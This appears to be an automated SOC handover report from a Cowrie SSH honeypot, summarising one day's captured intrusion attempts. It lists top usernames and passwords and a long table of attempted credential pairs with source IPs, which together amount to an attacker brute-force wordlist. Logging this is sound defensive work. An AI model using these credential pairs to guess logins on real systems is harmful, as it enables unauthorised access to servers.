# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-12 |
| **Generated At** | 2026-09-12T16:52:18Z |
| **Shift Time** | 16:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **130** |
| Confirmed Threats | **120** |
| False Positives Filtered | **10** (7.7%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **13** |
| High Severity Cases | **96** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **34** |
| Malware Samples Analyzed | **5** HIGH · **21** MED · 17 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **405** |
| Unique Credential Pairs | **394** |
| Unique Usernames | **127** |
| Unique Passwords | **295** |
| Successful Auth Pairs | **400** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 155 |
| `Guest` | 36 |
| `testuser` | 35 |
| `ubuntu` | 8 |
| `admin` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 59 |
| `admin` | 8 |
| `password` | 6 |
| `123456` | 4 |
| `admin123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 3 |
| `support` | `support` | 3 |
| `lthpc` | `password` | 2 |
| `test123` | `test123` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `node` | `1234` | `195.178.110.218` | 2026-09-12T12:55:21 |
| `vpn` | `vpn1234` | `10.0.0.73` | 2026-09-12T12:55:26 |
| `@dm1n12` | `` | `10.0.0.73` | 2026-09-12T12:56:06 |
| `root` | `win@1234` | `10.0.0.73` | 2026-09-12T12:56:27 |
| `Guest` | `admin123` | `10.0.0.73` | 2026-09-12T12:56:27 |
| `root` | `Vps01` | `10.0.0.73` | 2026-09-12T12:56:41 |
| `sniping` | `sniping` | `195.178.110.218` | 2026-09-12T12:56:56 |
| `@dm1n12345` | `` | `10.0.0.73` | 2026-09-12T12:57:29 |
| `Guest` | `Admin` | `10.0.0.73` | 2026-09-12T12:58:05 |
| `root` | `win@12345` | `10.0.0.73` | 2026-09-12T12:58:09 |
| `root` | `Vps02` | `10.0.0.73` | 2026-09-12T12:58:20 |
| `sniper-bot` | `sniper-bot` | `195.178.110.218` | 2026-09-12T12:58:29 |
| `vpn` | `vpn@1234` | `10.0.0.73` | 2026-09-12T12:58:32 |
| `Guest` | `admin` | `10.0.0.73` | 2026-09-12T12:59:47 |
| `root` | `win@123456` | `10.0.0.73` | 2026-09-12T12:59:50 |
| `root` | `Vps03` | `10.0.0.73` | 2026-09-12T13:00:00 |
| `sniper` | `sniper` | `195.178.110.218` | 2026-09-12T13:00:05 |
| `@dm1n1str@t0r1` | `` | `10.0.0.73` | 2026-09-12T13:00:16 |
| `Guest` | `Password` | `10.0.0.73` | 2026-09-12T13:01:26 |
| `root` | `win@2022` | `10.0.0.73` | 2026-09-12T13:01:32 |
| `vpn` | `vpn` | `10.0.0.73` | 2026-09-12T13:01:39 |
| `@dm1n1str@tor1` | `` | `10.0.0.73` | 2026-09-12T13:01:40 |
| `root` | `Vps04` | `10.0.0.73` | 2026-09-12T13:01:41 |
| `snip` | `snip` | `195.178.110.218` | 2026-09-12T13:01:46 |
| `@dm1n1strator1` | `` | `10.0.0.73` | 2026-09-12T13:03:03 |
| `Guest` | `password` | `10.0.0.73` | 2026-09-12T13:03:07 |
| `root` | `win@2023` | `10.0.0.73` | 2026-09-12T13:03:14 |
| `root` | `Vps1` | `10.0.0.73` | 2026-09-12T13:03:21 |
| `root` | `root1` | `195.178.110.218` | 2026-09-12T13:03:25 |
| `@dm1n2003` | `` | `10.0.0.73` | 2026-09-12T13:04:27 |
| `samba` | `samba@123` | `10.0.0.73` | 2026-09-12T13:04:45 |
| `Guest` | `P@ssword` | `10.0.0.73` | 2026-09-12T13:04:45 |
| `root` | `win@2024` | `10.0.0.73` | 2026-09-12T13:04:55 |
| `admin` | `admin1` | `195.178.110.218` | 2026-09-12T13:04:58 |
| `root` | `Vps123` | `10.0.0.73` | 2026-09-12T13:05:00 |
| `@dm1n2004` | `` | `10.0.0.73` | 2026-09-12T13:05:53 |
| `Guest` | `p@ssword` | `10.0.0.73` | 2026-09-12T13:06:23 |
| `user` | `user1` | `195.178.110.218` | 2026-09-12T13:06:32 |
| `root` | `win@2025` | `10.0.0.73` | 2026-09-12T13:06:37 |
| `root` | `Welcome!` | `10.0.0.73` | 2026-09-12T13:06:40 |
| `samba` | `samba123` | `10.0.0.73` | 2026-09-12T13:07:51 |
| `Guest` | `P@ssw0rd` | `10.0.0.73` | 2026-09-12T13:08:02 |
| `radar` | `123456` | `195.178.110.218` | 2026-09-12T13:08:10 |
| `root` | `Welcome!1` | `10.0.0.73` | 2026-09-12T13:08:20 |
| `@dm1n2008` | `` | `10.0.0.73` | 2026-09-12T13:08:42 |
| `root` | `micro123` | `10.0.0.73` | 2026-09-12T13:09:03 |
| `Guest` | `p@ssw0rd` | `10.0.0.73` | 2026-09-12T13:09:41 |
| `root` | `Lt111111` | `195.178.110.218` | 2026-09-12T13:09:44 |
| `root` | `Welcome@123` | `10.0.0.73` | 2026-09-12T13:09:59 |
| `@dm1n2009` | `` | `10.0.0.73` | 2026-09-12T13:10:02 |
| `samba` | `samba1234` | `10.0.0.73` | 2026-09-12T13:10:56 |
| `root` | `micro1234` | `10.0.0.73` | 2026-09-12T13:11:00 |
| `a1` | `a1` | `195.178.110.218` | 2026-09-12T13:11:18 |
| `Guest` | `P@SSW0RD` | `10.0.0.73` | 2026-09-12T13:11:20 |
| `@dm1n2010` | `` | `10.0.0.73` | 2026-09-12T13:11:26 |
| `root` | `Welcome@1234` | `10.0.0.73` | 2026-09-12T13:11:38 |
| `root` | `micro12345` | `10.0.0.73` | 2026-09-12T13:12:41 |
| `@dm1n2011` | `` | `10.0.0.73` | 2026-09-12T13:12:51 |
| `lthpc` | `Lt111111` | `195.178.110.218` | 2026-09-12T13:12:55 |
| `Guest` | `P@$$W0rd` | `10.0.0.73` | 2026-09-12T13:13:00 |
| `root` | `Welcome123` | `10.0.0.73` | 2026-09-12T13:13:18 |
| `samba` | `samba@1234` | `10.0.0.73` | 2026-09-12T13:14:05 |
| `root` | `micro123456` | `10.0.0.73` | 2026-09-12T13:14:24 |
| `lthpc` | `password` | `195.178.110.218` | 2026-09-12T13:14:36 |
| `Guest` | `pass@123` | `10.0.0.73` | 2026-09-12T13:14:40 |
| `root` | `Welcome2` | `10.0.0.73` | 2026-09-12T13:14:59 |
| `@dm1n55` | `` | `10.0.0.73` | 2026-09-12T13:15:39 |
| `Guest` | `Pass@123` | `10.0.0.73` | 2026-09-12T13:16:21 |
| `root` | `Welcome3` | `10.0.0.73` | 2026-09-12T13:16:38 |
| `root` | `micro2022` | `10.0.0.73` | 2026-09-12T13:16:52 |
| `@dm1n66` | `` | `10.0.0.73` | 2026-09-12T13:17:04 |
| `samba` | `samba` | `10.0.0.73` | 2026-09-12T13:17:12 |
| `lthpc` | `123456` | `195.178.110.218` | 2026-09-12T13:17:50 |
| `Guest` | `PASS@123` | `10.0.0.73` | 2026-09-12T13:18:01 |
| `root` | `Wiki123` | `10.0.0.73` | 2026-09-12T13:18:18 |
| `@dm1n77` | `` | `10.0.0.73` | 2026-09-12T13:18:28 |
| `root` | `micro2023` | `10.0.0.73` | 2026-09-12T13:18:32 |
| `liquid` | `liquid` | `195.178.110.218` | 2026-09-12T13:19:27 |
| `Guest` | `ABC@123` | `10.0.0.73` | 2026-09-12T13:19:40 |
| `@dm1n88` | `` | `10.0.0.73` | 2026-09-12T13:19:52 |
| `root` | `Win!2015` | `10.0.0.73` | 2026-09-12T13:19:57 |
| `root` | `micro2024` | `10.0.0.73` | 2026-09-12T13:20:15 |
| `kingbase` | `kingbase@123` | `10.0.0.73` | 2026-09-12T13:20:20 |
| `test123` | `test123` | `195.178.110.218` | 2026-09-12T13:21:06 |
| `@dm1nistr@tor1` | `` | `10.0.0.73` | 2026-09-12T13:21:16 |
| `Guest` | `Abc@123` | `10.0.0.73` | 2026-09-12T13:21:20 |
| `root` | `win@2008` | `10.0.0.73` | 2026-09-12T13:21:38 |
| `root` | `micro2025` | `10.0.0.73` | 2026-09-12T13:22:31 |
| `service` | `service` | `195.178.110.218` | 2026-09-12T13:22:41 |
| `@dm1nistrator` | `` | `10.0.0.73` | 2026-09-12T13:22:43 |
| `Guest` | `abc@123` | `10.0.0.73` | 2026-09-12T13:22:59 |
| `root` | `win2003` | `10.0.0.73` | 2026-09-12T13:23:17 |
| `kingbase` | `kingbase123` | `10.0.0.73` | 2026-09-12T13:23:27 |
| `@dm1nistrator1` | `` | `10.0.0.73` | 2026-09-12T13:24:04 |
| `rotasmart` | `rotasmart` | `195.178.110.218` | 2026-09-12T13:24:16 |
| `Guest` | `Aa@123` | `10.0.0.73` | 2026-09-12T13:24:36 |
| `root` | `Windows@123` | `10.0.0.73` | 2026-09-12T13:24:56 |
| `root` | `micro@123` | `10.0.0.73` | 2026-09-12T13:25:17 |
| `@dmin.!` | `` | `10.0.0.73` | 2026-09-12T13:25:30 |
| `smart` | `smart` | `195.178.110.218` | 2026-09-12T13:25:52 |
| `ubuntu` | `zaq12wsx` | `97.74.236.4` | 2026-09-12T13:26:00 |
| `345gs5662d34` | `345gs5662d34` | `97.74.236.4` | 2026-09-12T13:26:05 |
| `ubuntu` | `3245gs5662d34` | `97.74.236.4` | 2026-09-12T13:26:06 |
| `Guest` | `AA@123` | `10.0.0.73` | 2026-09-12T13:26:16 |
| `kingbase` | `kingbase1234` | `10.0.0.73` | 2026-09-12T13:26:34 |
| `ubuntu` | `admin@123456` | `101.47.156.21` | 2026-09-12T13:26:38 |
| `root` | `Windows2012` | `10.0.0.73` | 2026-09-12T13:26:41 |
| `345gs5662d34` | `345gs5662d34` | `101.47.156.21` | 2026-09-12T13:26:42 |
| `ubuntu` | `3245gs5662d34` | `101.47.156.21` | 2026-09-12T13:26:46 |
| `@dmin.@` | `` | `10.0.0.73` | 2026-09-12T13:26:54 |
| `root` | `micro@1234` | `10.0.0.73` | 2026-09-12T13:27:27 |
| `usr1cv8` | `usr1cv8` | `195.178.110.218` | 2026-09-12T13:27:32 |
| `Guest` | `AA123` | `10.0.0.73` | 2026-09-12T13:27:55 |
| `@dmin0` | `` | `10.0.0.73` | 2026-09-12T13:28:18 |
| `root` | `winver#22` | `10.0.0.73` | 2026-09-12T13:28:18 |
| `serv` | `serv` | `195.178.110.218` | 2026-09-12T13:29:10 |
| `root` | `micro@12345` | `10.0.0.73` | 2026-09-12T13:29:21 |
| `Guest` | `aa@123` | `10.0.0.73` | 2026-09-12T13:29:34 |
| `kingbase` | `kingbase@1234` | `10.0.0.73` | 2026-09-12T13:29:40 |
| `root` | `wsxasd` | `10.0.0.73` | 2026-09-12T13:29:58 |
| `cephadm` | `cephadm` | `195.178.110.218` | 2026-09-12T13:30:45 |
| `root` | `micro@123456` | `10.0.0.73` | 2026-09-12T13:31:01 |
| `@dmin2002` | `` | `10.0.0.73` | 2026-09-12T13:31:06 |
| `Guest` | `Aa123` | `10.0.0.73` | 2026-09-12T13:31:12 |
| `root` | `www.baidu.com` | `10.0.0.73` | 2026-09-12T13:31:39 |
| `dvr` | `dvr` | `195.178.110.218` | 2026-09-12T13:32:25 |
| `@dmin2003` | `` | `10.0.0.73` | 2026-09-12T13:32:33 |
| `root` | `micro@2022` | `10.0.0.73` | 2026-09-12T13:32:46 |
| `kingbase` | `kingbase` | `10.0.0.73` | 2026-09-12T13:32:47 |
| `Guest` | `Aa@1234` | `10.0.0.73` | 2026-09-12T13:32:52 |
| `root` | `www.netbank.com` | `10.0.0.73` | 2026-09-12T13:33:21 |
| `@dmin2004` | `` | `10.0.0.73` | 2026-09-12T13:33:53 |
| `wexter` | `wexter` | `195.178.110.218` | 2026-09-12T13:34:05 |
| `root` | `micro@2023` | `10.0.0.73` | 2026-09-12T13:34:27 |
| `Guest` | `AA@1234` | `10.0.0.73` | 2026-09-12T13:34:33 |
| `root` | `WY2wXP*a` | `10.0.0.73` | 2026-09-12T13:35:02 |
| `@dmin2006` | `` | `10.0.0.73` | 2026-09-12T13:35:17 |
| `cephadmin` | `cephadmin` | `195.178.110.218` | 2026-09-12T13:35:42 |
| `info` | `info@123` | `10.0.0.73` | 2026-09-12T13:35:56 |
| `Guest` | `AA1234` | `10.0.0.73` | 2026-09-12T13:36:11 |
| `root` | `micro@2024` | `10.0.0.73` | 2026-09-12T13:36:14 |
| `@dmin2007` | `` | `10.0.0.73` | 2026-09-12T13:36:41 |
| `root` | `yy*123` | `10.0.0.73` | 2026-09-12T13:36:43 |
| `a` | `123456` | `195.178.110.218` | 2026-09-12T13:37:17 |
| `Guest` | `aa@1234` | `10.0.0.73` | 2026-09-12T13:37:49 |
| `root` | `micro@2025` | `10.0.0.73` | 2026-09-12T13:37:55 |
| `root` | `z` | `10.0.0.73` | 2026-09-12T13:38:25 |
| `super` | `super` | `195.178.110.218` | 2026-09-12T13:38:58 |
| `info` | `info123` | `10.0.0.73` | 2026-09-12T13:39:05 |
| `Guest` | `Aa1234` | `10.0.0.73` | 2026-09-12T13:39:28 |
| `@dmin2009` | `` | `10.0.0.73` | 2026-09-12T13:39:30 |
| `root` | `microsoft123` | `10.0.0.73` | 2026-09-12T13:39:39 |
| `root` | `Z!x2c3v4b5n` | `10.0.0.73` | 2026-09-12T13:40:08 |
| `public` | `public` | `195.178.110.218` | 2026-09-12T13:40:38 |
| `@dmin2011` | `` | `10.0.0.73` | 2026-09-12T13:40:53 |
| `Guest` | `Aa@12345` | `10.0.0.73` | 2026-09-12T13:41:07 |
| `root` | `microsoft1234` | `10.0.0.73` | 2026-09-12T13:41:21 |
| `root` | `ZAQ!@WSX!@#` | `10.0.0.73` | 2026-09-12T13:41:49 |
| `info` | `info1234` | `10.0.0.73` | 2026-09-12T13:42:14 |
| `codex` | `codex` | `195.178.110.218` | 2026-09-12T13:42:14 |
| `@dmin66` | `` | `10.0.0.73` | 2026-09-12T13:42:16 |
| `Guest` | `AA@12345` | `10.0.0.73` | 2026-09-12T13:42:45 |
| `root` | `ZAQ!@WSX#` | `10.0.0.73` | 2026-09-12T13:43:28 |
| `@dmin99` | `` | `10.0.0.73` | 2026-09-12T13:43:41 |
| `scylla` | `scylla` | `195.178.110.218` | 2026-09-12T13:43:50 |
| `Guest` | `AA12345` | `10.0.0.73` | 2026-09-12T13:44:23 |
| `@dmin@!` | `` | `10.0.0.73` | 2026-09-12T13:45:04 |
| `root` | `ZAQ!2wsx` | `10.0.0.73` | 2026-09-12T13:45:10 |
| `info` | `info@1234` | `10.0.0.73` | 2026-09-12T13:45:20 |
| `root` | `microsoft123456` | `10.0.0.73` | 2026-09-12T13:45:23 |
| `nobara` | `nobara` | `195.178.110.218` | 2026-09-12T13:45:30 |
| `Guest` | `aa@12345` | `10.0.0.73` | 2026-09-12T13:46:05 |
| `admin` | `admin` | `167.233.164.13` | 2026-09-12T13:46:18 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-12T13:46:18 |
| `@dmin@.` | `` | `10.0.0.73` | 2026-09-12T13:46:27 |
| `root` | `ZAQ!xs` | `10.0.0.73` | 2026-09-12T13:46:51 |
| `goose` | `goose` | `195.178.110.218` | 2026-09-12T13:47:11 |
| `root` | `microsoft2022` | `10.0.0.73` | 2026-09-12T13:47:24 |
| `Guest` | `Aa12345` | `10.0.0.73` | 2026-09-12T13:47:44 |
| `@dmin@admin` | `` | `10.0.0.73` | 2026-09-12T13:47:54 |
| `info` | `info` | `10.0.0.73` | 2026-09-12T13:48:27 |
| `root` | `------fuck------` | `10.0.0.73` | 2026-09-12T13:48:32 |
| `root` | `Zaq@12345` | `10.0.0.73` | 2026-09-12T13:48:32 |
| `bank` | `bank` | `195.178.110.218` | 2026-09-12T13:48:47 |
| `support` | `support` | `80.94.95.118` | 2026-09-12T13:48:57 |
| `support` | `support` | `10.0.0.73` | 2026-09-12T13:48:59 |
| `root` | `microsoft2023` | `10.0.0.73` | 2026-09-12T13:49:05 |
| `Guest` | `A@123` | `10.0.0.73` | 2026-09-12T13:49:22 |
| `root` | `zaq12` | `10.0.0.73` | 2026-09-12T13:50:14 |
| `loginuser` | `sophos` | `195.178.110.218` | 2026-09-12T13:50:25 |
| `@dministrador` | `` | `10.0.0.73` | 2026-09-12T13:50:41 |
| `root` | `microsoft2024` | `10.0.0.73` | 2026-09-12T13:50:47 |
| `Guest` | `a@123` | `10.0.0.73` | 2026-09-12T13:51:02 |
| `squid` | `squid@123` | `10.0.0.73` | 2026-09-12T13:51:34 |
| `support` | `support` | `138.226.239.233` | 2026-09-12T13:51:46 |
| `root` | `zaq12wsx!` | `10.0.0.73` | 2026-09-12T13:51:57 |
| `admin` | `admin` | `195.178.110.218` | 2026-09-12T13:52:06 |
| `root` | `microsoft2025` | `10.0.0.73` | 2026-09-12T13:52:30 |
| `Guest` | `A@1` | `10.0.0.73` | 2026-09-12T13:52:42 |
| `ADM.@` | `` | `10.0.0.73` | 2026-09-12T13:53:28 |
| `root` | `Zaq1xsw2` | `10.0.0.73` | 2026-09-12T13:53:39 |
| `admin` | `admin1234` | `195.178.110.218` | 2026-09-12T13:53:46 |
| `root` | `microsoft@123` | `10.0.0.73` | 2026-09-12T13:54:12 |
| `Guest` | `a@1` | `10.0.0.73` | 2026-09-12T13:54:21 |
| `squid` | `squid123` | `10.0.0.73` | 2026-09-12T13:54:44 |
| `ADM1N` | `` | `10.0.0.73` | 2026-09-12T13:54:49 |
| `root` | `zebra` | `10.0.0.73` | 2026-09-12T13:55:20 |
| `root` | `root1234` | `195.178.110.218` | 2026-09-12T13:55:21 |
| `testuser` | `` | `10.0.0.73` | 2026-09-12T13:55:55 |
| `root` | `microsoft@1234` | `10.0.0.73` | 2026-09-12T13:56:32 |
| `test` | `test1234` | `195.178.110.218` | 2026-09-12T13:56:58 |
| `root` | `zt0803` | `10.0.0.73` | 2026-09-12T13:56:59 |
| `testuser` | `123123` | `10.0.0.73` | 2026-09-12T13:57:12 |
| `squid` | `squid1234` | `10.0.0.73` | 2026-09-12T13:57:47 |
| `ADM1N1` | `` | `10.0.0.73` | 2026-09-12T13:57:50 |
| `root` | `microsoft@12345` | `10.0.0.73` | 2026-09-12T13:58:20 |
| `root` | `Zxc123123` | `10.0.0.73` | 2026-09-12T13:58:40 |
| `testuser` | `123321` | `10.0.0.73` | 2026-09-12T13:58:51 |
| `root` | `microsoft@123456` | `10.0.0.73` | 2026-09-12T14:00:00 |
| `admin123` | `admin123` | `195.178.110.218` | 2026-09-12T14:00:18 |
| `root` | `zxcASD123` | `10.0.0.73` | 2026-09-12T14:00:19 |
| `squid` | `squid@1234` | `10.0.0.73` | 2026-09-12T14:00:51 |
| `root` | `c` | `77.90.185.20` | 2026-09-12T14:00:52 |
| `ADM1N1STR@T0R2002` | `` | `10.0.0.73` | 2026-09-12T14:00:58 |
| `root` | `microsoft@2022` | `10.0.0.73` | 2026-09-12T14:01:39 |
| `root123` | `root123` | `195.178.110.218` | 2026-09-12T14:01:55 |
| `root` | `zxcASDqwe` | `10.0.0.73` | 2026-09-12T14:01:59 |
| `testuser` | `321321` | `10.0.0.73` | 2026-09-12T14:02:03 |
| `ADM1N1STR@T0R2009` | `` | `10.0.0.73` | 2026-09-12T14:02:25 |
| `root` | `microsoft@2023` | `10.0.0.73` | 2026-09-12T14:03:19 |
| `user123` | `user123` | `195.178.110.218` | 2026-09-12T14:03:34 |
| `testuser` | `123@123` | `10.0.0.73` | 2026-09-12T14:03:40 |
| `root` | `zxcASDqwe!@#` | `10.0.0.73` | 2026-09-12T14:03:40 |
| `ADM1N1STR@T0R2010` | `` | `10.0.0.73` | 2026-09-12T14:03:55 |
| `squid` | `squid` | `10.0.0.73` | 2026-09-12T14:03:56 |
| `root` | `microsoft@2024` | `10.0.0.73` | 2026-09-12T14:05:01 |
| `user` | `user123` | `195.178.110.218` | 2026-09-12T14:05:17 |
| `testuser` | `123@321` | `10.0.0.73` | 2026-09-12T14:05:19 |
| `root` | `ZXCasdQWE123` | `10.0.0.73` | 2026-09-12T14:05:22 |
| `ADM1N1STR@T0R55` | `` | `10.0.0.73` | 2026-09-12T14:05:33 |
| `root` | `microsoft@2025` | `10.0.0.73` | 2026-09-12T14:06:41 |
| `admin` | `123` | `195.178.110.218` | 2026-09-12T14:06:57 |
| `testuser` | `321@123` | `10.0.0.73` | 2026-09-12T14:06:59 |
| `admin1` | `admin1@123` | `10.0.0.73` | 2026-09-12T14:07:02 |
| `root` | `zxcvASDF` | `10.0.0.73` | 2026-09-12T14:07:03 |
| `ADM1N1STR@T0R77` | `` | `10.0.0.73` | 2026-09-12T14:07:05 |
| `root` | `cloud123` | `10.0.0.73` | 2026-09-12T14:08:20 |
| `testuser` | `321@321` | `10.0.0.73` | 2026-09-12T14:08:33 |
| `user` | `admin` | `195.178.110.218` | 2026-09-12T14:08:34 |
| `root` | `zxcvASDFqwer` | `10.0.0.73` | 2026-09-12T14:08:42 |
| `root` | `cloud1234` | `10.0.0.73` | 2026-09-12T14:10:00 |
| `admin1` | `admin1123` | `10.0.0.73` | 2026-09-12T14:10:03 |
| `testuser` | `123!@#` | `10.0.0.73` | 2026-09-12T14:10:10 |
| `root` | `admin` | `195.178.110.218` | 2026-09-12T14:10:11 |
| `ADM1N1STR@TOR2011` | `` | `10.0.0.73` | 2026-09-12T14:10:18 |
| `root` | `zxcvASDFqwer!@#$` | `10.0.0.73` | 2026-09-12T14:10:22 |
| `root` | `cloud12345` | `10.0.0.73` | 2026-09-12T14:11:39 |
| `testuser` | `Admin@123` | `10.0.0.73` | 2026-09-12T14:11:47 |
| `ubuntu` | `admin` | `195.178.110.218` | 2026-09-12T14:11:52 |
| `root` | `Zxcvbnm1` | `10.0.0.73` | 2026-09-12T14:12:01 |
| `admin1` | `admin11234` | `10.0.0.73` | 2026-09-12T14:13:08 |
| `root` | `cloud123456` | `10.0.0.73` | 2026-09-12T14:13:22 |
| `testuser` | `admin@123` | `10.0.0.73` | 2026-09-12T14:13:24 |
| `ubuntu` | `aa123456` | `195.178.110.218` | 2026-09-12T14:13:31 |
| `ADM1N1STR@TOR77` | `` | `10.0.0.73` | 2026-09-12T14:13:40 |
| `root` | `123abc!` | `10.0.0.73` | 2026-09-12T14:13:41 |
| `root` | `cloud2022` | `10.0.0.73` | 2026-09-12T14:15:00 |
| `testuser` | `Admin!@#` | `10.0.0.73` | 2026-09-12T14:15:03 |
| `addhost` | `addhost` | `195.178.110.218` | 2026-09-12T14:15:09 |
| `root` | `1qaz!@#$` | `10.0.0.73` | 2026-09-12T14:15:20 |
| `ADM1N1STRATOR2010` | `` | `10.0.0.73` | 2026-09-12T14:15:27 |
| `admin1` | `admin1@1234` | `10.0.0.73` | 2026-09-12T14:16:10 |
| `root` | `cloud2023` | `10.0.0.73` | 2026-09-12T14:16:40 |
| `testuser` | `admin!@#` | `10.0.0.73` | 2026-09-12T14:16:42 |
| `deploy` | `deploy` | `195.178.110.218` | 2026-09-12T14:16:52 |
| `ADM1N1STRATOR2013` | `` | `10.0.0.73` | 2026-09-12T14:16:54 |
| `root` | `dell@123` | `10.0.0.73` | 2026-09-12T14:17:00 |
| `testuser` | `Admin123` | `10.0.0.73` | 2026-09-12T14:18:17 |
| `root` | `cloud2024` | `10.0.0.73` | 2026-09-12T14:18:21 |
| `deployer` | `deployer` | `195.178.110.218` | 2026-09-12T14:18:35 |
| `root` | `abc123.` | `10.0.0.73` | 2026-09-12T14:18:41 |
| `admin1` | `admin1` | `10.0.0.73` | 2026-09-12T14:19:17 |
| `testuser` | `admin123` | `10.0.0.73` | 2026-09-12T14:19:53 |
| `root` | `cloud2025` | `10.0.0.73` | 2026-09-12T14:20:00 |
| `ADM1N1STRATOR99` | `` | `10.0.0.73` | 2026-09-12T14:20:13 |
| `joseph` | `joseph` | `195.178.110.218` | 2026-09-12T14:20:16 |
| `root` | `www.163.com` | `10.0.0.73` | 2026-09-12T14:20:20 |
| `testuser` | `Admin` | `10.0.0.73` | 2026-09-12T14:21:29 |
| `root` | `cloud@123` | `10.0.0.73` | 2026-09-12T14:21:39 |
| `joseph` | `password` | `195.178.110.218` | 2026-09-12T14:21:54 |
| `ADM1N2009` | `` | `10.0.0.73` | 2026-09-12T14:21:54 |
| `root` | `2` | `10.0.0.73` | 2026-09-12T14:21:59 |
| `solr` | `solr@123` | `10.0.0.73` | 2026-09-12T14:22:19 |
| `testuser` | `admin` | `10.0.0.73` | 2026-09-12T14:23:07 |
| `root` | `cloud@1234` | `10.0.0.73` | 2026-09-12T14:23:19 |
| `Administrator` | `Administrator` | `195.178.110.218` | 2026-09-12T14:23:35 |
| `root` | `1qaz2wsx` | `10.0.0.73` | 2026-09-12T14:23:40 |
| `testuser` | `Password` | `10.0.0.73` | 2026-09-12T14:24:43 |
| `root` | `huawei@123` | `10.0.0.73` | 2026-09-12T14:25:16 |
| `ubuntu` | `ubuntu` | `195.178.110.218` | 2026-09-12T14:25:17 |
| `solr` | `solr123` | `10.0.0.73` | 2026-09-12T14:25:22 |
| `root` | `cloud@12345` | `10.0.0.73` | 2026-09-12T14:25:23 |
| `testuser` | `password` | `10.0.0.73` | 2026-09-12T14:26:29 |
| `root` | `!QAZ2wsx` | `195.178.110.218` | 2026-09-12T14:26:56 |
| `root` | `1.q` | `10.0.0.73` | 2026-09-12T14:26:57 |
| `root` | `cloud@123456` | `10.0.0.73` | 2026-09-12T14:27:18 |
| `testuser` | `P@ssword` | `10.0.0.73` | 2026-09-12T14:28:03 |
| `solr` | `solr1234` | `10.0.0.73` | 2026-09-12T14:28:21 |
| `root` | `Huawei12#$` | `10.0.0.73` | 2026-09-12T14:28:34 |
| `root` | `cloud@2022` | `10.0.0.73` | 2026-09-12T14:28:56 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-09-12T14:29:40 |
| `testuser` | `p@ssword` | `10.0.0.73` | 2026-09-12T14:29:40 |
| `root` | `1q!` | `10.0.0.73` | 2026-09-12T14:30:14 |
| `test` | `test@123` | `195.178.110.218` | 2026-09-12T14:30:21 |
| `root` | `cloud@2023` | `10.0.0.73` | 2026-09-12T14:30:36 |
| `testuser` | `P@ssw0rd` | `10.0.0.73` | 2026-09-12T14:31:17 |
| `solr` | `solr@1234` | `10.0.0.73` | 2026-09-12T14:31:26 |
| `root` | `333` | `10.0.0.73` | 2026-09-12T14:31:53 |
| `tyler` | `tyler` | `195.178.110.218` | 2026-09-12T14:32:04 |
| `root` | `cloud@2024` | `10.0.0.73` | 2026-09-12T14:32:17 |
| `root` | `!root` | `80.94.92.234` | 2026-09-12T14:32:49 |
| `testuser` | `p@ssw0rd` | `10.0.0.73` | 2026-09-12T14:32:55 |
| `uucp` | `uucp` | `138.226.239.234` | 2026-09-12T14:33:20 |
| `root` | `qweasdzxc` | `10.0.0.73` | 2026-09-12T14:33:32 |
| `colin` | `colin` | `195.178.110.218` | 2026-09-12T14:33:43 |
| `root` | `cloud@2025` | `10.0.0.73` | 2026-09-12T14:34:03 |
| `solr` | `solr` | `10.0.0.73` | 2026-09-12T14:34:28 |
| `root` | `111111` | `80.94.92.234` | 2026-09-12T14:35:00 |
| `ADMINISTR@TOR0` | `` | `10.0.0.73` | 2026-09-12T14:35:16 |
| `radar` | `radar` | `195.178.110.218` | 2026-09-12T14:35:23 |
| `root` | `server123` | `10.0.0.73` | 2026-09-12T14:36:04 |
| `testuser` | `P@$$W0rd` | `10.0.0.73` | 2026-09-12T14:36:07 |
| `root` | `test1234` | `10.0.0.73` | 2026-09-12T14:36:48 |
| `ADMINISTR@TOR2002` | `` | `10.0.0.73` | 2026-09-12T14:36:50 |
| `brian` | `brian` | `195.178.110.218` | 2026-09-12T14:37:05 |
| `root` | `123123` | `80.94.92.234` | 2026-09-12T14:37:16 |
| `kafka` | `kafka@123` | `10.0.0.73` | 2026-09-12T14:37:37 |
| `root` | `server1234` | `10.0.0.73` | 2026-09-12T14:37:45 |
| `testuser` | `pass@123` | `10.0.0.73` | 2026-09-12T14:37:45 |
| `ADMINISTR@TOR99` | `` | `10.0.0.73` | 2026-09-12T14:38:14 |
| `root` | `server2014` | `10.0.0.73` | 2026-09-12T14:38:27 |
| `erp` | `erp` | `195.178.110.218` | 2026-09-12T14:38:45 |
| `testuser` | `Pass@123` | `10.0.0.73` | 2026-09-12T14:39:23 |
| `root` | `server12345` | `10.0.0.73` | 2026-09-12T14:39:23 |
| `root` | `1234` | `80.94.92.234` | 2026-09-12T14:39:30 |
| `username` | `password` | `138.226.239.234` | 2026-09-12T14:39:52 |
| `root` | `Ab123456789` | `10.0.0.73` | 2026-09-12T14:40:05 |
| `abbas` | `abbas` | `195.178.110.218` | 2026-09-12T14:40:22 |
| `kafka` | `kafka123` | `10.0.0.73` | 2026-09-12T14:40:39 |
| `testuser` | `PASS@123` | `10.0.0.73` | 2026-09-12T14:40:59 |
| `root` | `server123456` | `10.0.0.73` | 2026-09-12T14:41:03 |
| `ADMINISTRATEUR!` | `` | `10.0.0.73` | 2026-09-12T14:41:22 |
| `root` | `P@ssW0rd` | `10.0.0.73` | 2026-09-12T14:41:43 |
| `root` | `12345` | `80.94.92.234` | 2026-09-12T14:41:48 |
| `abas` | `abas` | `195.178.110.218` | 2026-09-12T14:42:05 |
| `testuser` | `ABC@123` | `10.0.0.73` | 2026-09-12T14:42:36 |
| `root` | `server2022` | `10.0.0.73` | 2026-09-12T14:42:43 |
